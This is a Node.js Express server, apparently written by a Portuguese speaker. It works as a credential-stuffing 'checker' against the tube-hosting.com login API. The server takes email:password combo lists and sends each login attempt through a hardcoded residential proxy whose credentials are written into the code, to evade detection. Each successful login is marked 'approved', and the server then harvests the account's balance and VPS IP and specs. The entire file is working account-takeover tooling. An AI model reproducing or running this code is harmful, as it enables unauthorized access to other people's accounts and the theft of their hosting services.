const express = require('express');
const axios = require('axios');
const cors = require('cors');
const HttpsProxyAgent = require('https-proxy-agent');
const HttpProxyAgent = require('http-proxy-agent');

// segurança básica para evitar ataques comuns
const helmet = require('helmet');

// a api só pode ser acessada de localhost ou de uma lista de urls confiáveis
const allowedOrigins = ['http://localhost'];
const corsOptions = {
  origin: function (origin, callback) {
    if (!origin || allowedOrigins.indexOf(origin) !== -1) {
        callback(null, true);
    } else {
        callback(new Error('Not allowed by CORS'));
    }
    }
};

app.use(helmet());
app.use(cors(corsOptions));

const app = express();
const port = 3000;
const urlapi = "https://api.tube-hosting.com/login";
const urlvps = "https://api.tube-hosting.com/servicegroups/currents?primaryOnly=false";

const proxyUrl = 'http://ScSiwC84JB70_custom_zone_BR_st__city_sid_72143557_time_5:2791483@change4.owlproxy.com:7778';

const httpsAgent = new HttpsProxyAgent.HttpsProxyAgent(proxyUrl);
const httpAgent = new HttpProxyAgent.HttpProxyAgent(proxyUrl);

app.use(express.json());

async function testProxy() {
  try {
    const response = await axios.get('https://api.ipify.org?format=json', {
      httpsAgent: httpsAgent,
      httpAgent: httpAgent,
      timeout: 15000
    });
    console.log('✅ Proxy funcionando! IP:', response.data.ip);
    return true;
  } catch (error) {
    console.error('Erro ao testar proxy:', error.message);
    return false;
  }
}

function extractVpsInfo(servicesData) {
    const vpsList = [];
    
    if (!servicesData || !Array.isArray(servicesData)) {
        return vpsList;
    }
    
    for (const service of servicesData) {
        const metaData = service.metaData || {};
        const groupData = service.groupData || {};
        const services = groupData.services || [];
        
        for (const serv of services) {
            if (serv.type === 'VPS') {
                const primaryIPv4 = serv.primaryIPv4 || {};
                const ipv4Data = primaryIPv4.ipv4 || {};
                const ip = ipv4Data.ipv4 || 'N/A';
                
                const cores = serv.coreCount || 'N/A';
                const memory = serv.memory || 0;
                const diskSpace = serv.diskSpace || 0;
                const diskType = serv.diskType || 'N/A';
                const vpsType = serv.vpsType || 'LXC';
                
                let vencimento = 'N/A';
                const deactivationDate = metaData.deactivationDate;
                if (deactivationDate) {
                    const date = new Date(deactivationDate);
                    vencimento = date.toLocaleDateString('pt-BR');
                }
                
                const nome = metaData.name || serv.name || 'N/A';
                const status = metaData.status || (groupData.active ? 'ACTIVE' : 'INACTIVE');
                
                vpsList.push({
                    nome: nome,
                    ip: ip,
                    cores: `${cores} Cores`,
                    ram: memory,
                    ram_gb: (memory / 1024).toFixed(1),
                    disco: diskSpace,
                    disco_gb: (diskSpace / 1024).toFixed(0),
                    disco_type: diskType,
                    vps_type: vpsType,
                    vencimento: vencimento,
                    status: status
                });
            }
        }
    }
    
    return vpsList;
}

app.get('/api/checker', async (req, res) => {
    const lista = req.query.lista;
    
    if (!lista) {
        return res.status(400).json({
            status: 'error',
            message: 'Faltando parâmetro lista! Formato: email:senha'
        });
    }
    
    const [email, senha] = lista.split(':');
    
    if (!email || !senha) {
        return res.status(400).json({
            status: 'error',
            message: 'Email e senha são obrigatórios, viado!'
        });
    }
    
    console.log(`\n[*] Testando GET: ${email}`);
    
    const payload = {
        mail: email,
        password: senha,
        token: null,
        device: {
            name: "",
            model: "chrome",
            type: "WEB"
        }
    };
    
    try {
        const loginResponse = await axios.post(urlapi, payload, {
            httpsAgent: httpsAgent,
            httpAgent: httpAgent,
            timeout: 30000,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Content-Type': 'application/json',
                'Accept': 'application/json'
            }
        });
        
        const loginData = loginResponse.data;
        
        if (!loginData.userData || !loginData.userData.id) {
            console.log(`❌ REPROVADO: ${email}`);
            return res.json({
                status: 'declined',
                message: 'Credenciais inválidas',
                email: email
            });
        }
        
        console.log(`✅ Login aprovado: ${email}`);
        
        const accessToken = loginData.accessToken;
        let vpsInfo = [];
        
        if (accessToken) {
            try {
                const servicesResponse = await axios.get(urlvps, {
                    headers: { 'Authorization': `Bearer ${accessToken}` },
                    httpsAgent: httpsAgent,
                    httpAgent: httpAgent,
                    timeout: 30000
                });
                
                vpsInfo = extractVpsInfo(servicesResponse.data);
                console.log(`📡 Encontradas ${vpsInfo.length} VPS(s)`);
            } catch (err) {
                console.error(`Erro ao buscar serviços: ${err.message}`);
            }
        }
        
        const userData = loginData.userData;
        
        if (vpsInfo.length > 0) {
            const vps = vpsInfo[0];
            res.json({
                status: 'approved',
                message: 'Login aprovado!',
                dados_usuario: {
                    id: userData.id,
                    nome: `${userData.firstname || ''} ${userData.lastname || ''}`.trim(),
                    email: userData.mail,
                    saldo: userData.balance || 0
                },
                vps: {
                    ip: vps.ip,
                    cpu: `${vps.cores} Cores`,
                    ram: `${vps.ram_gb} GB`,
                    disco: `${vps.disco_gb} GB`,
                    vencimento: vps.vencimento,
                    status: vps.status
                }
            });
        } else {
            res.json({
                status: 'approved',
                message: 'Login aprovado, mas nenhuma VPS encontrada!',
                user: {
                    id: userData.id,
                    nome: `${userData.firstname || ''} ${userData.lastname || ''}`.trim(),
                    email: userData.mail,
                    saldo: userData.balance || 0
                }
            });
        }
        
    } catch (error) {
        console.error(`ERRO: ${error.message}`);
        res.json({
            status: 'error',
            message: error.message,
            email: email
        });
    }
});

app.get('/api/add-proxy', (req, res) => {
  const newProxy = req.query.proxy;

  if (!newProxy) {
    return res.json({ error: 'Use: /api/add-proxy?proxy=http://user:pass@host:port' });
  }

  httpsAgent.options.proxy = newProxy;
  httpAgent.options.proxy = newProxy;

  res.json({ message: 'Proxy atualizada com sucesso!', proxy: newProxy.replace(/:.+@/, ':***@') });
});

app.get('/api/test-proxy', async (_, res) => {
  const working = await testProxy();
  res.json({
    proxy_working: working,
    proxy_url: proxyUrl.replace(/:.+@/, ':***@')
  });
});

app.get('/api/test', async (req, res) => {
  const { email, senha } = req.query;

  if (!email || !senha) {
    return res.json({ error: 'Use: /api/test?email=xxx&senha=xxx' });
  }

  try {
    const response = await axios.post(urlapi, {
      mail: email,
      password: senha,
      token: null,
      device: { name: "", model: "chrome", type: "WEB" }
    }, {
      httpsAgent: httpsAgent,
      httpAgent: httpAgent,
      timeout: 30000
    });

    res.json({
      status: response.data?.status_code === 200 ? 'approved' : 'declined',
      data: response.data
    });
  } catch (error) {
    res.json({ status: 'error', message: error.message });
  }
});

app.use('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

app.listen(port, async () => {
  console.log(`
    ╔══════════════════════════════════════════════════════════╗
    ║   API RODANDO!                                    ║
    ║   Porta: ${port}                                         ║
    ║                                                          ║
    ║   Endpoints:                                           ║
    ║      GET  /api/test-proxy          - Testa o proxy       ║
    ║      GET  /api/test?email=X&senha=Y - Teste rápido       ║
    ║      POST /api/checker?lista=...   - Checker completo    ║
    ║     GET  /api/add-proxy?proxy=...    - Adicionar nova proxy║
    ║                                                          ║
    ╚══════════════════════════════════════════════════════════╝
    `);

  await testProxy();
});